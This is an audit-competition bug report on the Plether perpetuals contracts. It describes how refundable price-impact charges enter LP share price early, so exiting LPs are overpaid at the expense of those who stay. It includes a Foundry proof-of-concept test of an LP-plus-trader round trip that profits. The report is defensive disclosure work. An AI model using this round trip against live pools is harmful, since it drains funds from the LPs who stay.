# \#99607 [SC-Critical] Refundable VPI charges are counted as LP equity as soon as they are collected, so exiting LPs are overpaid and the LPs who stay fund the rebate

**Submitted on Nov 14th 2026 at 13:15:56 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99607
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description


## Summary

A trade that increases skew pays a price-impact (VPI) charge into the pool. The pool books the charge as trading revenue, and the next LP settlement puts it into the share price. At that point the charge is not earned. When the position closes and skew falls, the pool pays back up to the same amount as a rebate, and LP accounting holds nothing against that rebate. An LP whose redemption is funded while the position is open takes a share of the charge with them, and the LPs who stay pay the rebate. This happens on any LP exit at high skew, with nobody misbehaving. An LP with a large stake can also trigger it on purpose and profit.

## Description

**What happens to the charge**

- **Open.** A skew-increasing open pays k·(S₁² − S₀²)/(2D) to the pool. It is recorded as `ClaimantInflowKind.Revenue` (`CfdEngineSettlementSidecar.sol:454-464`), waits in `pendingTradingRevenueAssets`, and is allocated to the tranches at the next LP settlement (`HousePool.sol:835`), before the junior redemption is priced and funded (`HousePool.sol:840-841`, `:882`).
- **Close.** When the position closes and skew falls, the pool pays a rebate, capped so the position's lifetime VPI cannot go below zero (`libraries/CloseAccountingLib.sol:116-118`). At unchanged depth the rebate equals the charge. The whitepaper's own example is a $20,000 charge followed by a $20,000 rebate (`WHITEPAPER.md:903-904`).
- **Otherwise.** The pool keeps the charge only if the position is liquidated (`WHITEPAPER.md:870-871`, `libraries/CfdEnginePlanLib.sol:1559`) or the pool has no free cash and the rebate is waived (`ACCOUNTING_SPEC.md:1061-1063`).

So while the position is open, the charge is money the pool gives back on an ordinary close.

**The LP NAV has no entry for the rebate.** Deposits and redemptions are priced from one formula (`ACCOUNTING_SPEC.md:164-166`):

```text
signedTerminalEquity = physicalAssets
                     - totalTraderClaimBalanceAssets
                     + terminalLpPriceDeltaAssets
```

`physicalAssets` includes the VPI cash, and nothing offsets the rebate. Up to k·S²/(2D) of refundable charges is priced as LP equity. At the release settings (`vpiFactor` 0.01, `maxSkewRatio` 0.4) that is 8 bps of pool depth.

**What the docs say, and why it does not make this intended**

1. `SECURITY.md:871-872` reads in full:

   > new close-time action rebates use only pool cash free after protecting existing trader claims. Unfunded value is waived rather than claim-backed, and neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV

   `ACCOUNTING_SPEC.md:1064-1066` says the same. The rule is that expected VPI stays out of the book, and the stated purpose is that VPI must not inflate NAV. The code follows the rule. This report is about what the rule does to a positive balance. Leaving out an expected receivable (the clawback owed by a trader with negative lifetime VPI) keeps NAV down, which is the purpose. Leaving out an expected payable while counting the cash already collected pushes NAV up. On the positive side, the purpose stated in that sentence is not met.

2. The docs already apply the principle to the negative side. The trader-funded VPI reserve "cannot be extracted by LPs before its account obligation settles" (`ACCOUNTING_SPEC.md:821-822`; `WHITEPAPER.md:887-888` says the same). On the positive side LPs do extract the charge before the position's obligation settles.

3. The spec calls the NAV symmetric because "an entrant receives the same discount for inherited marked liabilities that an exiting LP bears" (`ACCOUNTING_SPEC.md:172-173`). The pending rebate is inherited in the same way, and the exiting LP does not bear it.

4. `WHITEPAPER.md:811` names the pool as the beneficiary of positive VPI, and the limitation at `:1777-1780` says depth changes and clamps alter VPI amounts along a path. Neither says which LPs fund a refund. The telescoping property at `:851-857` supports this report: at unchanged depth the pool's net VPI take depends only on current skew, so it is a balance held against that skew and not accumulated income.

5. The comment on the clamp (`CloseAccountingLib.sol:112-115`) describes an "LP sandwich": open, reduce pool depth, close. The clamp stops the trader's side of it by capping the rebate at the charge. The LP's side is still open, because the LP who removed the depth leaves with part of the charge.

6. It is neither listed nor tested. The VPI and LP limitations in `SECURITY.md:1380-1444` do not mention it. Every LP settlement spec under `test/perps/spec/lp` runs with `vpiFactor` 0, and the VPI accounting invariant puts the tranche waterfall out of scope (`test/perps/invariant/properties/PerpVpiFrozenAccountingInvariant.t.sol:12-14`).

**Steps**, with two LPs holding 1.0M each (figures from the zero-carry run):

1. A trader opens 800,000 USDG of notional, which takes skew to the 40% limit. The pool collects about 1,600 USDG of VPI as pending revenue.
2. LP A's redemption matures. That settlement allocates the pending revenue to LP equity and pays A at the higher share price.
3. The trader closes at the same price. The pool pays the rebate.
4. A has received 799 USDG more than in a run with no trade. B, who stayed, ends 479 USDG worse off and gets back less than it deposited. If A and the trader are the same party, they net 159 USDG after both execution fees.

B's loss is 479 and not 799 because the 320 USDG execution fee on the close is netted against the rebate and stays in the pool.

The change in depth is not what causes the loss. A's exit halves the pool, so the fresh rebate would be larger than the charge, and the clamp cuts it back to exactly the charge. That is what the trader would receive at constant depth anyway.

**Not a duplicate.** The scan has two findings about temporarily moving pool liquidity around a close: "Temporary pool liquidity can reduce a skew-increasing close charge" and "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate". Both are about the size of a VPI amount. Here the rebate is the correct size. The loss comes from the charge sitting in the share price while the position is open. It happens with an unrelated LP and no depth manipulation, and a fix for depth manipulation would not remove it.

**Suggested fix.** Keep collected positive VPI out of LP equity while the position that paid it is open. Hold it in a pool-side reserve, pay close rebates from it, and release what is left to LP revenue when the position's obligation ends: on close (whatever was not refunded), on liquidation, or when a rebate is waived. This mirrors the trader-funded reserve already used for negative VPI, and it needs no estimate of the future rebate.

## Impact

direct theft of user funds (LP principal, not unclaimed yield). Value moves from the LPs who stay to LPs who exit, on every exit funded while skew is high. In the test the LP who stays gets back less than it deposited. The amount is bounded by 8 bps of pool depth at the skew limit: 799 USDG on a 1.0M stake in the test. A deliberate round trip pays for an LP holding more than about 40% of the pool, since the gain is their pool share times 8 bps of depth and the cost is two 4 bps execution fees on 40% of depth. The LPs who stay cannot avoid it short of exiting first.



## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/perps/VpiRevenueInflatesLpExit.t.sol` and run:

```
forge test --root packages/perps --match-contract VpiRevenueInflatesLpExit -vvv
```

The scenario funds two junior LPs with 1.0M each and runs LP A's full exit twice from the same snapshot. In the control run nobody trades. In the second run a trader opens 800,000 USDG of notional before A's redemption is funded and closes right after, at an unchanged price. LP B then redeems in both runs, and the test compares what each LP received.

Two contracts run it. `VpiRevenueInflatesLpExitTest` sets carry to zero so the numbers isolate VPI. `VpiRevenueInflatesLpExitReleaseCarryTest` uses every release risk parameter, carry included. Carry does not change the result: on this position it is under 2 USDG an hour, against a charge of about 1,600 USDG. The logs print the charge, both LPs' payouts in each run, and the trader's round-trip cost.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "./shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice A skew-increasing open pays a VPI charge that is recorded as LP revenue and allocated to LP equity
///         at the next LP settlement, although the pool hands it back when the position closes. An LP whose
///         redemption is funded at that settlement is paid a share of money the pool still owes, and the LPs
///         who stay cover the rebate.
///
/// The scenario runs the same LP exit twice from one snapshot:
///   - control: LP A redeems, then LP B redeems; nobody trades;
///   - attack:  a trader opens to the skew limit before A's redemption is funded and closes right after.
/// Price never moves and both runs use identical timestamps, so the only difference between them is the trade.
///
/// Two contracts run it: one with carry zeroed, so the numbers isolate VPI, and one with every risk parameter
/// at its release value.
///
/// Run both:
///   forge test --root packages/perps --match-contract VpiRevenueInflatesLpExit -vvv
abstract contract VpiRevenueInflatesLpExitScenario is HousePoolAsyncTestBase {

    address private constant LP_A = address(0xA11CE);
    address private constant LP_B = address(0xB0B);
    address private constant TRADER = address(0x7EADE);

    uint256 private constant LP_STAKE = 1_000_000e6;
    uint256 private constant PRICE = 1e8;
    /// 800,000 USDG of notional: just inside the 40% skew limit on a pool of about 2.0M.
    uint256 private constant SIZE = 800_000e18;
    uint256 private constant MARGIN = 50_000e6;

    struct Outcome {
        uint256 paidA;
        uint256 paidB;
        uint256 vpiCharge;
        uint256 traderCost;
    }

    /// Annualized carry rate for this run, in basis points.
    function _carryBps() internal pure virtual returns (uint256);

    /// Release risk parameters (script/DeployPerpsArbitrumSepolia.s.sol), with the carry rate set per contract.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: _carryBps(),
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// The two LPs below are the whole junior tranche apart from the 1,000 USDG seed.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();

        _fundJunior(LP_A, LP_STAKE);
        _fundJunior(LP_B, LP_STAKE);
        _fundTrader(TRADER, 100_000e6);
        _finishAsyncCooldown(juniorVault, LP_B);
        _finishAsyncCooldown(juniorVault, LP_A);
    }

    function test_ExitingLpIsOverpaidByRefundableVpiAndStayingLpPaysForIt() public {
        uint256 snapshot = vm.snapshotState();
        Outcome memory control = _run(false);
        assertTrue(vm.revertToState(snapshot));
        Outcome memory attack = _run(true);

        emit log_named_uint("carry rate, bps per year", _carryBps());
        emit log_named_decimal_uint("VPI charge collected at open", attack.vpiCharge, 6);
        emit log_named_decimal_uint("LP A paid, control", control.paidA, 6);
        emit log_named_decimal_uint("LP A paid, with trade", attack.paidA, 6);
        emit log_named_decimal_uint("LP B paid, control", control.paidB, 6);
        emit log_named_decimal_uint("LP B paid, with trade", attack.paidB, 6);
        emit log_named_decimal_uint("trader round-trip cost", attack.traderCost, 6);

        // 1. The exiting LP is paid more for the same shares at the same price.
        assertGt(attack.paidA, control.paidA, "exiting LP is overpaid");
        uint256 overpaid = attack.paidA - control.paidA;
        emit log_named_decimal_uint("LP A overpaid by", overpaid, 6);

        // 2. The overpayment is A's share of the refundable charge: A holds half of the junior tranche.
        assertApproxEqRel(overpaid, attack.vpiCharge / 2, 0.02e18, "overpayment is A's share of the VPI charge");

        // 3. The LP who stays ends with less than in the control run.
        assertLt(attack.paidB, control.paidB, "staying LP funds the rebate");
        emit log_named_decimal_uint("LP B short by", control.paidB - attack.paidB, 6);

        // 4. The trader got the charge back at close. Its cost is the two execution fees, plus about an hour
        //    of carry in the release-carry run. If LP A is also the trader, the pair still comes out ahead.
        assertGt(overpaid, attack.traderCost, "LP A plus trader net a profit after fees");
        emit log_named_decimal_uint("LP A plus trader net", overpaid - attack.traderCost, 6);
    }

    function _run(
        bool withTrade
    ) private returns (Outcome memory outcome) {
        // LP A queues a full exit.
        uint256 sharesA = juniorVault.balanceOf(LP_A);
        uint256 requestA = _requestAsyncRedeem(juniorVault, LP_A, sharesA);

        // The trader pushes skew to the limit. The pool collects the VPI charge.
        uint256 traderBefore = clearinghouse.balanceAssets(TRADER);
        if (withTrade) {
            _open(TRADER, CfdTypes.Side.LONG, SIZE, MARGIN, PRICE);
            (,,,,,, int256 vpiAccrued) = engine.positions(TRADER);
            assertGt(vpiAccrued, int256(0), "fixture: the open must pay a positive VPI charge");
            outcome.vpiCharge = uint256(vpiAccrued);
        }

        // A's epoch matures and is funded at the pool's current share price.
        _settleAsyncRequest(requestA, true);
        assertFalse(engine.isFadWindow(), "fixture: weekday, live market");
        uint256 fundedA;
        (fundedA, outcome.paidA) = _claimAsyncRedeem(juniorVault, requestA, LP_A);
        assertEq(fundedA, sharesA, "fixture: A's exit is fully funded");

        // The trader closes at the same price. Skew returns to zero and the pool pays the rebate.
        if (withTrade) {
            _close(TRADER, CfdTypes.Side.LONG, SIZE, PRICE);
            (uint256 size,,,,,,) = engine.positions(TRADER);
            assertEq(size, 0, "fixture: position closed");
            outcome.traderCost = traderBefore - clearinghouse.balanceAssets(TRADER);
        }

        // LP B exits one epoch later. What B receives is what was left for the LP who stayed.
        uint256 sharesB = juniorVault.balanceOf(LP_B);
        uint256 requestB = _requestAsyncRedeem(juniorVault, LP_B, sharesB);
        _settleAsyncRequest(requestB, true);
        uint256 fundedB;
        (fundedB, outcome.paidB) = _claimAsyncRedeem(juniorVault, requestB, LP_B);
        assertEq(fundedB, sharesB, "fixture: B's exit is fully funded");
    }

}

/// Carry is LP revenue too. This run zeroes it so the result isolates VPI.
contract VpiRevenueInflatesLpExitTest is VpiRevenueInflatesLpExitScenario {

    function _carryBps() internal pure override returns (uint256) {
        return 0;
    }

}

/// The same scenario with every risk parameter at its release value, carry included.
contract VpiRevenueInflatesLpExitReleaseCarryTest is VpiRevenueInflatesLpExitScenario {

    function _carryBps() internal pure override returns (uint256) {
        return 500;
    }

}
```
